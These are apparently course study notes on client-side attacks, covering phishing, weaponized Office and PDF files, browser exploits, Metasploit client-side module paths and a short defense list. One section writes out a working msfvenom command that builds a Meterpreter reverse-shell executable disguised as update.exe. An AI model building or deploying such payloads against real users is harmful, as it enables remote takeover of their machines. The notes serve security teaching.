# Client-Side Attacks

## Introduction to Client-Side Attacks
*   **Definition**: Client-side attacks target the end user (client) rather than directly exploiting a server or network service. The attacker tricks the victim into executing malicious content, which then leads to compromise.
*   **Core Requirement**: These attacks rely heavily on user interaction.

### What Are Client-Side Attacks?
Client-side attacks occur when a user:
*   Opens a file
*   Clicks a malicious link
*   Visits a compromised or malicious website
*   Runs a trojanized application
*   Enables macros or scripts

> Note: The vulnerability exists in client applications, not the OS service itself.

### Key Characteristics
*   Require user interaction
*   Target browsers, document viewers, media players
*   Often delivered via:
    *   Email
    *   Websites
    *   USB drives
    *   Social engineering
*   Commonly bypass firewalls (because outbound traffic is often allowed)

---

## Common Targets
*   Web browsers (Chrome, Edge, Firefox)
*   Microsoft Office (Word, Excel, PowerPoint)
*   PDF readers (Adobe Reader)
*   Media players
*   Email clients
*   Java / Flash (legacy)

---

## Types of Client-Side Attacks

### 1. Phishing Attacks
*   Involves fake emails or websites.
*   Tricks users into:
    *   Entering credentials
    *   Downloading malware
*   **Example**: `Invoice.docm` (malicious macro)

### 2. Malicious Documents (Office / PDF)
*   **Weaponized formats**:
    *   `.docm`
    *   `.xlsm`
    *   `.pdf`
*   **Uses**:
    *   Macros
    *   Embedded exploits
    *   Shellcode
*   **Example**: User clicks "Enable Content" -> Payload executes

### 3. Browser-Based Attacks
*   Drive-by downloads
*   Malicious JavaScript
*   Exploit kits
*   **Trigger**: Occurs when a user visits a web page.

### 4. Executable Payload Delivery
*   User runs malicious executables such as:
    *   `update.exe`
    *   `patch.msi`

### 5. Social Engineering Attacks
*   Fake software updates
*   Fake error messages
*   Tech support scams
*   *Relies on human trust, not technical flaws.*

---

## Tools and Methodology

### Client-Side Attacks in Metasploit
Metasploit provides client-side exploit modules, such as:

    use exploit/windows/browser/*
    use exploit/windows/fileformat/*
    use exploit/multi/browser/*


**Examples:**
*   Malicious PDF
*   Browser exploit
*   Office macro payload
*   Java applet attack

### Typical Client-Side Attack Flow
1.  Attacker creates a payload (EXE / DOC / PDF).
2.  Payload is delivered to the victim.

## Typical Client-Side Attack Flow
1. Attacker creates a payload (EXE / DOC / PDF).
2. Payload is delivered to the victim.
3. Victim opens or executes it.
4. Payload runs.
5. Reverse shell / Meterpreter session established. [image:1]

---

## Example: Client-Side Payload Creation
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=443 -f exe -o update.exe
    Victim executes update.exe 

### Why Client-Side Attacks Are Effective

- Firewalls allow outbound traffic.

- Users trust documents and emails.

- Antivirus may miss obfuscated payloads.

- Zero-days and misconfigurations exist. [image:1]

### Defense Against Client-Side Attacks

- User awareness training.

- Disable macros by default.

- Patch client applications.

- Email filtering.

